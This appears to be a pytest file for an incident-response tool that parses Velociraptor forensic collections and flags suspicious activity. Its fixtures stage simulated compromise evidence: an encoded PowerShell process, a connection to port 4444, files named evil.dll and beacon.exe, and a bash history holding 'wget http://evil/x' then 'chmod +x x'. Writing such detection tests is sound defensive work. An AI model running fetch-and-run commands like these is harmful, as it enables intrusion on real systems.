import json
from pathlib import Path

import pytest

from el.evidence import intake as intake_mod
from el.orchestrator.coordinator import Coordinator
from el.orchestrator.states import State
from el.skills import velociraptor


@pytest.fixture
def isolated(tmp_path, monkeypatch):
    monkeypatch.setattr(intake_mod, "CASE_ROOT", tmp_path / "cases")
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    yield tmp_path


def _make_velo_collection(d: Path):
    d.mkdir(parents=True, exist_ok=True)
    pslist = d / "Windows.System.Pslist.json"
    pslist.write_text(
        json.dumps({"Pid": 4, "Ppid": 0, "Name": "System", "Hostname": "WIN-EP01"}) + "\n" +
        json.dumps({"Pid": 1234, "Ppid": 4, "Name": "explorer.exe", "Hostname": "WIN-EP01",
                    "CommandLine": "C:\\Windows\\explorer.exe"}) + "\n" +
        json.dumps({"Pid": 5678, "Ppid": 1234, "Name": "powershell.exe", "Hostname": "WIN-EP01",
                    "CommandLine": "powershell -enc <b64>"}) + "\n"
    )
    netstat = d / "Windows.Network.Netstat.json"
    netstat.write_text(
        json.dumps({"Pid": 5678, "RemoteAddr": "203.0.113.7", "RemotePort": 4444,
                    "Status": "ESTABLISHED"}) + "\n"
    )


def test_parser_handles_jsonl(tmp_path):
    coll = tmp_path / "coll"
    _make_velo_collection(coll)
    s = velociraptor.parse(coll, tmp_path / "out")
    assert s.process_count == 3
    assert s.netstat_count == 1
    assert "pslist" in s.parsed and "netstat" in s.parsed


def test_coordinator_routes_velociraptor_dir(isolated):
    coll = isolated / "vrcoll"
    _make_velo_collection(coll)
    result = Coordinator().investigate(coll, case_id="t-velo")
    assert result.investigator == "EndpointAnalystAgent"
    assert result.final_state == State.DONE
    from el.evidence.ledger import list_findings
    rows = list_findings(result.case_dir, case_id="t-velo")
    network = [f for f in rows if "suspicious ports" in (f.claim or "")]
    assert network, "expected suspicious-port flag from netstat artifact"


# --- Tier 4.2: post-v0.7 artifact recognition --------------------------

def test_parser_recognises_v07_pe_dump(tmp_path):
    coll = tmp_path / "coll"
    coll.mkdir()
    (coll / "Generic.System.PEDump.json").write_text(
        json.dumps({"PID": 1234, "Path": "C:\\evil.dll", "Hash": "abc"}) + "\n"
        + json.dumps({"PID": 5678, "Path": "C:\\beacon.exe"}) + "\n"
    )
    s = velociraptor.parse(coll, tmp_path / "out")
    assert s.pe_dump_count == 2
    assert "pe_dump" in s.parsed


def test_parser_recognises_windows_memory_processinfo(tmp_path):
    coll = tmp_path / "coll"
    coll.mkdir()
    (coll / "Windows.Memory.ProcessInfo.json").write_text(
        json.dumps({"PID": 1234, "VAD_count": 42}) + "\n"
    )
    s = velociraptor.parse(coll, tmp_path / "out")
    assert s.process_info_count == 1
    assert "process_info" in s.parsed


def test_parser_recognises_mft_amcache_lnk(tmp_path):
    coll = tmp_path / "coll"
    coll.mkdir()
    (coll / "Windows.NTFS.MFT.json").write_text(
        "\n".join(json.dumps({"Inode": i, "Name": f"f{i}.txt"})
                  for i in range(5)) + "\n"
    )
    (coll / "Windows.Forensics.Amcache.json").write_text(
        json.dumps({"Path": "C:\\evil.exe"}) + "\n"
    )
    (coll / "Windows.Forensics.Lnk.json").write_text(
        json.dumps({"TargetPath": "C:\\Documents\\sales.docx"}) + "\n"
    )
    s = velociraptor.parse(coll, tmp_path / "out")
    assert s.mft_record_count == 5
    assert s.amcache_count == 1
    assert s.lnk_count == 1


def test_parser_recognises_linux_artifacts(tmp_path):
    coll = tmp_path / "coll"
    coll.mkdir()
    (coll / "Linux.Sys.Pslist.json").write_text(
        json.dumps({"PID": 1, "Cmd": "/sbin/init"}) + "\n"
        + json.dumps({"PID": 1234, "Cmd": "bash"}) + "\n"
    )
    (coll / "Linux.Network.Netstat.json").write_text(
        json.dumps({"src": "10.0.0.5", "dst": "1.2.3.4", "dport": 22}) + "\n"
    )
    (coll / "Linux.Forensics.BashHistory.json").write_text(
        json.dumps({"User": "alice", "Command": "wget http://evil/x"}) + "\n"
        + json.dumps({"User": "alice", "Command": "chmod +x x"}) + "\n"
    )
    s = velociraptor.parse(coll, tmp_path / "out")
    assert s.linux_process_count == 2
    assert s.linux_netstat_count == 1
    assert s.bash_history_count == 2


def test_parser_summary_payload_includes_new_counts(tmp_path):
    """The persisted summary JSON should expose all the post-v0.7 counts."""
    coll = tmp_path / "coll"
    coll.mkdir()
    (coll / "Generic.System.PEDump.json").write_text(
        json.dumps({"PID": 1, "Path": "x"}) + "\n"
    )
    out = tmp_path / "out"
    s = velociraptor.parse(coll, out)
    payload = json.loads((out / "velociraptor_summary.json").read_text())
    assert "pe_dump_count" in payload
    assert payload["pe_dump_count"] == 1
    # Backwards compatibility: legacy fields still present.
    assert "process_count" in payload
    assert "netstat_count" in payload
